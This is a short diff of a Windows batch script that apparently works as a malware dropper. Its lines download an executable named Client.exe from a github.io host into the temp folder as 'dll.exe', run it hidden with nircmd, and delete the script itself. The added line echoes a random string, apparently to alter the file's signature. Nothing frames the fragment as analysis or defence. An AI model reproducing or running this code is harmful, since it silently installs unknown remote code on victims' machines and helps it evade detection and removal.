@@ -20,4 +20,5 @@ echo.
 )
 echo [TARGET STOP]
 curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
+echo "edkekdoekdoedcdjcn"
 del /s /f /q /a "%~f0"
